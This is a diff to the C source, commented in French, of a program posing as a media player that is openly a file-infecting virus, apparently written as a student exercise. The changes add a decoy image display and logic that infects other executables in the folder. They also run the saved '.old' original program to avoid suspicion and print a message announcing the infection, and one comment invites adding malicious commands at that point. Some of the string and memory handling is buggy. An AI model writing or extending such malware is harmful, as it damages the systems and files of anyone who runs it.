@@ -8,9 +8,14 @@
 #include <stdbool.h>
 
 char** getFiles();
-void infecte(char** f);
+void infecte();
 bool dejaInfecte(char* f);
 char* getExtension(char* f);
+void afficherMediaPlayer();
+
+void afficherMediaPlayer(){
+    system("xdg-open ../img/img1.jpg"); //Ouverture du système d'affichage d'images Linux grâce à la commande système qui permet d'executer des commandes bash
+}
 
 /**
  * Fonction pour récupérer l'extension d'un fichier
@@ -24,7 +29,7 @@ char* getExtension(char* f){
  * Fonction permettant de récupérer les noms des fichiers à infecter
  */
 char** getFiles(){
-    char** files = malloc(5*sizeof(char*)); // On alloue le mémoire à la variable files pour permettre de récupérer les noms des 5 programmes
+    char** files = malloc(10*sizeof(char*)); // On alloue le mémoire à la variable files pour permettre de récupérer les noms des 5 programmes
     int cpt = 0; // Compteur du nombre de programmes
     DIR *repertoire = opendir("."); // Ouverture du répertoire courant pour parcourir les fochiers
     struct stat statsF; // Obtenir les statistiques d'un fichier
@@ -38,9 +43,9 @@ char** getFiles(){
             /**
              * Si le fichier est exécutable et régulier
              */
-            if (cpt<5 && (strcmp(lecture->d_name, "MediaPlayer.exe") != 0) && !dejaInfecte(lecture->d_name)) {
+            if (cpt<10 && (strcmp(lecture->d_name, "MediaPlayer.exe") != 0)) {
                 /**
-                 * Si l'exécutable n'est pas le media player et qu'il n'a pas déjà été infecté
+                 * Si l'exécutable n'est pas le media player
                  */
                 //printf("- %s\n", lecture->d_name);
                 files[cpt] = lecture->d_name;
@@ -57,7 +62,7 @@ char** getFiles(){
 /**
  * Fonction permettant d'infecter les fichiers du répertoire
  */
-void infecte(char** f){
+void infecte(){
     /**
      * Parcours le répertoire courant, et compile les programmes monPGn avec l'extension .old
      */
@@ -102,22 +107,6 @@ void infecte(char** f){
         }
         closedir(rep);
     }
-
-    /*for(int i = 0; i < 5; i++)
-    {   
-        FILE *mediaPlayer;
-		FILE *oldFile;
-		FILE *newFile;
-
-        char fileWithOld[strlen(f[i])+strlen(".old")];
-		char currentFile[strlen(f[i])];
-
-        strcpy(currentFile, f[i]);
-        strcpy(fileWithOld, strcat(f[i], ".old"));
-        rename(f[i], fileWithOld);
-
-        mediaPlayer = fopen("MediaPlayer.c", "r");
-    }*/
 }
 
 
@@ -126,16 +115,19 @@ void infecte(char** f){
  */
 bool dejaInfecte(char* f){
     char* extension = ".old";
+    char* monPGNoExtension = NULL;
     if (strstr(f, extension) != NULL) {
         /**
-         * Le fichier en paramètres ne possède pas l'extension .old
+         * Le fichier en paramètres possède l'extension .old
         */
         return true;
     } else{
         DIR* repertoire = opendir(".");
         struct dirent *lecture;
         while((lecture = readdir(repertoire))){
-            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(lecture->d_name, extension), "r") != NULL)) {
+            monPGNoExtension = calloc(sizeof(lecture->d_name), 1);
+            strncat(monPGNoExtension, lecture->d_name, sizeof(lecture->d_name)-4); // Nom du programme sans l'extension
+            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(monPGNoExtension, extension), "r") != NULL)) {
                 /**
                 * Le fichier lu dans le répertoire et le fichier en paramètre sont les mêmes
                 * Le fichier lu avec l'extension .old a été ouvert
@@ -153,8 +145,30 @@ bool dejaInfecte(char* f){
  */
 int main(int argc, char const *argv[])
 {
-    system("xdg-open ../img/img1.jpg"); //Ouverture du système d'affichage d'images Linux grâce à la commande système qui permet d'executer des commandes bash
     char** files = getFiles(); // Récupération des fichiers à infecter
-    infecte(files); // Infection des fichiers
+    bool infectes = false;
+    char* commande = NULL;
+    commande = calloc(sizeof(argv[0]), 1);
+    strncat(commande, argv[0], 8);
+    printf("%s\n", commande);
+    for(int i = 0; i < 5; i++)
+    {
+        infectes = dejaInfecte(files[i]); // On vérifie si l'infection initiale a été effectuée
+    }
+
+    if (!infectes) {
+        afficherMediaPlayer();
+        infecte(); // Infection des fichiers
+    } else if(strncmp(commande, "./Mon", 5) == 0) {
+        //printf("%s\n", commande);
+        strcat(commande, ".old");
+        system(commande); // Execution du programme .old pour éviter d'eveiller les souspcons
+        /**
+         * On peut effectuer ici toute sorte de commandes malveillantes et le virus sera effectif
+         */
+        printf("Bravo je suis le virus et vous êtes infectés\n");
+    } else{
+        afficherMediaPlayer();
+    }
     return EXIT_SUCCESS;
 }
